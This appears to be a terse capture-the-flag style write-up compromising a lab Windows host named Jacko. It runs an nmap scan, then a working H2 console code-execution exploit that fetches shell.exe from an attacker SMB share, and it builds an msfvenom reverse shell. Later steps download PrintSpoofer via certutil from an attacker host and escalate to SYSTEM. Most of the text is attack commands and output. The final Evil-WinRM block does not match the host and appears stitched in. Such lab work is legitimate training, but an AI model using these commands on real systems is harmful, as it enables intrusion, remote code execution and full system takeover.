```sh
nmap -sC -sV -oA jacko 192.168.140.66    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 21:49 CST
Nmap scan report for 192.168.140.66
Host is up (0.045s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 20s
| smb2-time: 
|   date: 2023-02-04T03:50:10
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.77 seconds
```

Found exploit

https://www.exploit-db.com/exploits/49384

Right now it is setup for Linux

```d
-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval"; CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.49.122/Share/shell.exe && shell.exe").getInputStream()).useDelimiter("\Z").next()');
```

Prepped this and generated the msfvenom file

`msfvenom -p windows/shell_reverse_tcp LHOST="192.168.49.122" LPORT=8082 -f exe > shell.exe`
Made sure to use the same port to avoid blocking

Used impacket to start smbserver with share.

`python smbserver.py -smb2support Share /home/kali/OPG/jacko`

Ran the script above in the H2 console after logging in.

Upon login I found commandds to not work. Set PATH
`set PATH=%SystemRoot%\system32;%SystemRoot%;`

```
C:\Windows\Temp>systeminfo
systeminfo

Host Name:                 JACKO
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18363 N/A Build 18363
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          tony
Registered Organization:   
Product ID:                00331-10000-00001-AA058
Original Install Date:     4/22/2020, 3:11:40 AM
System Boot Time:          8/12/2020, 2:20:45 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 634 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,112 MB
Virtual Memory: In Use:    1,575 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\JACKO
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4552931
                           [02]: KB4497165
                           [03]: KB4513661
                           [04]: KB4516115
                           [05]: KB4517245
                           [06]: KB4521863
                           [07]: KB4537759
                           [08]: KB4552152
                           [09]: KB4556799
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.122.66
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
C:\Windows\Temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

We are running on an older version of Windows 10 with SEImpersonatePrivilege enabled. We can use printspoofer.exe
`https://github.com/dievus/printspoofer`

`certutil.exe -urlcache -split -f "http://192.168.49.122/PrintSpoofer.exe" C:\Users\tony\Desktop\print.exe`

`C:\Users\tony\Desktop>print.exe -i -c cmd`
We are now system

```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```